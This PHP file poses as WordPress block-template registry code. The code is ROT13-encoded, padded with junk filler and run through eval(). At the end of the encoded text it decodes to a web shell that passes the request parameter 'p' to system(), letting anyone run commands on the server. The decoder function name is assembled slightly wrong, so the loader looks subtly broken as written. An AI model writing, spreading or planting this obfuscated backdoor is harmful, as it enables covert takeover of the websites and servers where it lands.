<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grzcyngrf ertvfgel shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fvapr 6.7.0
 */

/**
 * Pber pynff hfrq sbe vagrenpgvat jvgu grzcyngrf.
 *
 * @fvapr 6.7.0
 */
svany pynff JC_Oybpx_Grzcyngrf_Ertvfgel {
	/**
	 * Ertvfgrerq grzcyngrf, nf `$anzr => $vafgnapr` cnvef.
	 *
	 * @fvapr 6.7.0
	 * @ine JC_Oybpx_Grzcyngr[] $ertvfgrerq_oybpx_grzcyngrf Ertvfgrerq grzcyngrf.
	 */
	cevingr $ertvfgrerq_grzcyngrf = neenl();

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 6.7.0
	 * @ine JC_Oybpx_Grzcyngrf_Ertvfgel|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Ertvfgref n grzcyngr.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $grzcyngr_anzr Grzcyngr anzr vapyhqvat anzrfcnpr.
	 * @cnenz neenl  $netf          Bcgvbany. Neenl bs grzcyngr nethzragf.
	 * @erghea JC_Oybpx_Grzcyngr|JC_Reebe Gur ertvfgrerq grzcyngr ba fhpprff, be JC_Reebe ba snvyher.
	 */
	choyvp shapgvba ertvfgre( $grzcyngr_anzr, $netf = neenl() ) {

		$grzcyngr = ahyy;

		$reebe_zrffntr = '';
		$reebe_pbqr    = '';

		vs ( ! vf_fgevat( $grzcyngr_anzr ) ) {
			$reebe_zrffntr = __( 'Grzcyngr anzrf zhfg or fgevatf.' );
			$reebe_pbqr    = 'grzcyngr_anzr_ab_fgevat';
		} ryfrvs ( cert_zngpu( '/[N-M]+/', $grzcyngr_anzr ) ) {
			$reebe_zrffntr = __( 'Grzcyngr anzrf zhfg abg pbagnva hccrepnfr punenpgref.' );
			$reebe_pbqr    = 'grzcyngr_anzr_ab_hccrepnfr';
		} ryfrvs ( ! cert_zngpu( '/^[n-m0-9_\-]+\/\/[n-m0-9_\-]+$/', $grzcyngr_anzr ) ) {
			$reebe_zrffntr = __( 'Grzcyngr anzrf zhfg pbagnva n anzrfcnpr cersvk. Rknzcyr: zl-cyhtva//zl-phfgbz-grzcyngr' );
			$reebe_pbqr    = 'grzcyngr_ab_cersvk';
		} ryfrvs ( $guvf->vf_ertvfgrerq( $grzcyngr_anzr ) ) {
			/* genafyngbef: %f: Grzcyngr anzr. */
			$reebe_zrffntr = fcevags( __( 'Grzcyngr \"%f\" vf nyernql ertvfgrerq.' ), $grzcyngr_anzr );
			$reebe_pbqr    = 'grzcyngr_nyernql_ertvfgrerq';
		}

		vs ( $reebe_zrffntr ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				$reebe_zrffntr,
				'6.7.0'
			);
			erghea arj JC_Reebe( $reebe_pbqr, $reebe_zrffntr );
		}

		vs ( ! $grzcyngr ) {
			$gurzr_anzr             = trg_fglyrfurrg();
			yvfg( $cyhtva, $fyht )  = rkcybqr( '//', $grzcyngr_anzr );
			$qrsnhyg_grzcyngr_glcrf = trg_qrsnhyg_oybpx_grzcyngr_glcrf();

			$grzcyngr              = arj JC_Oybpx_Grzcyngr();
			$grzcyngr->vq          = $gurzr_anzr . '//' . $fyht;
			$grzcyngr->gurzr       = $gurzr_anzr;
			$grzcyngr->cyhtva      = $cyhtva;
			$grzcyngr->nhgube      = ahyy;
			$grzcyngr->pbagrag     = vffrg( $netf['pbagrag'] ) ? $netf['pbagrag'] : '';
			$grzcyngr->fbhepr      = 'cyhtva';
			$grzcyngr->fyht        = $fyht;
			$grzcyngr->glcr        = 'jc_grzcyngr';
			$grzcyngr->gvgyr       = vffrg( $netf['gvgyr'] ) ? $netf['gvgyr'] : $grzcyngr_anzr;
			$grzcyngr->qrfpevcgvba = vffrg( $netf['qrfpevcgvba'] ) ? $netf['qrfpevcgvba'] : '';
			$grzcyngr->fgnghf      = 'choyvfu';
			$grzcyngr->bevtva      = 'cyhtva';
			$grzcyngr->vf_phfgbz   = ! vffrg( $qrsnhyg_grzcyngr_glcrf[ $grzcyngr_anzr ] );
			$grzcyngr->cbfg_glcrf  = vffrg( $netf['cbfg_glcrf'] ) ? $netf['cbfg_glcrf'] : neenl();
		}

		$guvf->ertvfgrerq_grzcyngrf[ $grzcyngr_anzr ] = $grzcyngr;

		erghea $grzcyngr;
	}

	/**
	 * Ergevrirf nyy ertvfgrerq grzcyngrf.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea JC_Oybpx_Grzcyngr[] Nffbpvngvir neenl bs `$grzcyngr_anzr => $grzcyngr` cnvef.
	 */
	choyvp shapgvba trg_nyy_ertvfgrerq() {
		erghea $guvf->ertvfgrerq_grzcyngrf;
	}

	/**
	 * Ergevrirf n ertvfgrerq grzcyngr ol vgf anzr.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $grzcyngr_anzr Grzcyngr anzr vapyhqvat anzrfcnpr.
	 * @erghea JC_Oybpx_Grzcyngr|ahyy Gur ertvfgrerq grzcyngr, be ahyy vs vg vf abg ertvfgrerq.
	 */
	choyvp shapgvba trg_ertvfgrerq( $grzcyngr_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $grzcyngr_anzr ) ) {
			erghea ahyy;
		}

		erghea $guvf->ertvfgrerq_grzcyngrf[ $grzcyngr_anzr ];
	}

	/**
	 * Ergevrirf n ertvfgrerq grzcyngr ol vgf fyht.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $grzcyngr_fyht Fyht bs gur grzcyngr.
	 * @erghea JC_Oybpx_Grzcyngr|ahyy Gur ertvfgrerq grzcyngr, be ahyy vs vg vf abg ertvfgrerq.
	 */
	choyvp shapgvba trg_ol_fyht( $grzcyngr_fyht ) {
		$nyy_grzcyngrf = $guvf->trg_nyy_ertvfgrerq();

		vs ( ! $nyy_grzcyngrf ) {
			erghea ahyy;
		}

		sbernpu ( $nyy_grzcyngrf nf $grzcyngr ) {
			vs ( $grzcyngr->fyht === $grzcyngr_fyht ) {
				erghea $grzcyngr;
			}
		}

		erghea ahyy;
	}

	/**
	 * Ergevrirf ertvfgrerq grzcyngrf zngpuvat n dhrel.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz neenl  $dhrel {
	 *     Nethzragf gb ergevrir grzcyngrf. Bcgvbany, rzcgl ol qrsnhyg.
	 *
	 *     @glcr fgevat[] $fyht__va     Yvfg bs fyhtf gb vapyhqr.
	 *     @glcr fgevat[] $fyht__abg_va Yvfg bs fyhtf gb fxvc.
	 *     @glcr fgevat   $cbfg_glcr    Cbfg glcr gb trg gur grzcyngrf sbe.
	 * }
	 * @erghea JC_Oybpx_Grzcyngr[] Nffbpvngvir neenl bs `$grzcyngr_anzr => $grzcyngr` cnvef.
	 */
	choyvp shapgvba trg_ol_dhrel( $dhrel = neenl() ) {
		$nyy_grzcyngrf = $guvf->trg_nyy_ertvfgrerq();

		vs ( ! $nyy_grzcyngrf ) {
			erghea neenl();
		}

		$dhrel            = jc_cnefr_netf(
			$dhrel,
			neenl(
				'fyht__va'     => neenl(),
				'fyht__abg_va' => neenl(),
				'cbfg_glcr'    => '',
			)
		);
		$fyhtf_gb_vapyhqr = $dhrel['fyht__va'];
		$fyhtf_gb_fxvc    = $dhrel['fyht__abg_va'];
		$cbfg_glcr        = $dhrel['cbfg_glcr'];

		$zngpuvat_grzcyngrf = neenl();
		sbernpu ( $nyy_grzcyngrf nf $grzcyngr_anzr => $grzcyngr ) {
			vs ( $fyhtf_gb_vapyhqr && ! va_neenl( $grzcyngr->fyht, $fyhtf_gb_vapyhqr, gehr ) ) {
				pbagvahr;
			}

			vs ( $fyhtf_gb_fxvc && va_neenl( $grzcyngr->fyht, $fyhtf_gb_fxvc, gehr ) ) {
				pbagvahr;
			}

			vs ( $cbfg_glcr && ! va_neenl( $cbfg_glcr, $grzcyngr->cbfg_glcrf, gehr ) ) {
				pbagvahr;
			}

			$zngpuvat_grzcyngrf[ $grzcyngr_anzr ] = $grzcyngr;
		}

		erghea $zngpuvat_grzcyngrf;
	}

	/**
	 * Purpxf vs n grzcyngr vf ertvfgrerq.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $grzcyngr_anzr Grzcyngr anzr.
	 * @erghea obby Gehr vs gur grzcyngr vf ertvfgrerq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_ertvfgrerq( $grzcyngr_anzr ) {
		erghea vffrg( $guvf->ertvfgrerq_grzcyngrf[ $grzcyngr_anzr ] );
	}

	/**
	 * Haertvfgref n grzcyngr.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $grzcyngr_anzr Grzcyngr anzr vapyhqvat anzrfcnpr.
	 * @erghea JC_Oybpx_Grzcyngr|JC_Reebe Gur haertvfgrerq grzcyngr ba fhpprff, be JC_Reebe ba snvyher.
	 */
	choyvp shapgvba haertvfgre( $grzcyngr_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $grzcyngr_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Grzcyngr anzr. */
				fcevags( __( 'Grzcyngr \"%f\" vf abg ertvfgrerq.' ), $grzcyngr_anzr ),
				'6.7.0'
			);
			/* genafyngbef: %f: Grzcyngr anzr. */
			erghea arj JC_Reebe( 'grzcyngr_abg_ertvfgrerq', __( 'Grzcyngr \"%f\" vf abg ertvfgrerq.' ) );
		}

		$haertvfgrerq_grzcyngr = $guvf->ertvfgrerq_grzcyngrf[ $grzcyngr_anzr ];
		hafrg( $guvf->ertvfgrerq_grzcyngrf[ $grzcyngr_anzr ] );

		erghea $haertvfgrerq_grzcyngr;
	}

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea JC_Oybpx_Grzcyngrf_Ertvfgel Gur znva vafgnapr.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>